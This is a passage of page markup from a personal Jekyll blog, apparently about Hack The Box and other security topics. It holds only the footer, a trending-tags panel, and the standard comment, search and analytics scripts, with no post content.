reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
